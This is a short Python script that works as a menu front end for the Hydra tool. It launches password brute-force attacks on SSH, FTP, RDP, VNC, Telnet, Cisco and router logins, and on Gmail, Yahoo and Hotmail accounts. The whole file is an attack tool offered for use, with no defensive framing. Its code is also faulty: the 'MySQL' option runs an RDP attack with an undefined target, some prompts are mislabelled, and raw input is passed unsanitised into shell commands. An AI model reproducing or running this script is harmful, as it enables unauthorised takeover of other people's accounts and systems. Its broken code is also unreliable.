#/bin/env python 
import os
import time
import sys

print
print("1.Cisco Brute Force ")
print("2.VNC Brute Force")
print("3.FTP Brute Force")
print ("4.Gmail Brute Force")
print("5.SSH Brute Force")
print("6.TeamSpeak Brute Force")
print("7.Telnet Brute Force")
print("8.Yahoo Mail Brute Force")
print("9.Hotmail Brute Force")
print("10.Router Speedy Brute Force ")
print("11.RDP Brute Force")
print("12.MySQL Brute Force")
print
h = input("Hydra~> ")
if h == '1':
	i = input("Enter IP :")
	j = input("Wordlist :")
	os.system("hydra -P %s %s cisco" % (j, i))
	os.system("python hydra.py")
	time.sleep(5)
elif h == '2':
        i = input("Enter IP :")
        j = input("Wordlist :")
        os.system("hydra -P %s -e n -t 1 %s vnc -V" % (j, i))
        os.system("python hydra.py")
        time.sleep(5)
elif h == '3':
       u = input("User :")
       i = input("Enter IP :")
       j = input("Wordlist :")
       os.system("hydra -l %s -P %s %s ftp" % (u, j, i))
       os.system("python hydra.py")
       time.sleep(5)
elif h == '4':
        e = input("Email :")
        j = input("Wordlist :")
        os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (e, j))
        os.system("python hydra.py")
        time.sleep(5)
elif h == '5':
        u = input("User :")
        i = input("IP :")
        j = input("Wordlist :")
        os.system("hydra -l %s -P %s %s ssh" % (u,j, i))
        time.sleep(5)
elif h == '6':
        u = input("User :")
        i = input("IP :")
        j = input("Wordlist :")
        os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (u, j, i))
        time.sleep(5)
elif h == '7':
	u = input("User :")
	i = input("IP :")
	j = input("Wordlist :")
	os.system("hydra -l %s -P %s %s telnet" % (u, j, i))
	time.sleep(5)
elif h == '8':
	e = input("Email :")
	j = input("Wordlist :")
	os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (e, j))
	time.sleep(5)
elif h == '9':
	e = input("Email :")
	j = input("Wordlist :")
	os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (e, j))
	time.sleep(5)
elif h == '10':
	u = input("User :")
	i = input("Email :")
	j = input("Wordlist :")
	os.system("hydra -m / -l %s -P %s %s http-get" % (u, j, i))
	time.sleep(5)
elif h == '11':
	u = input("User :")
	i = input("Email :")
	j = input("Wordlist :")
	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
	time.sleep(5)
elif h == '12':
	u = input("User :")
	j = input("'Wordlist :")
	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
	time.sleep(5)
elif h == 'back':
	main()	
elif h == 'help':
	print(""" This is an powerful bruteforcing tool called hydra.select any desired tool and bruteforce it using any wordlist (ex : example.txt).
	""")
	os.system("python hydra.py")
else:
	sys.exit(1)
	
	

	


	
	
  
  
 
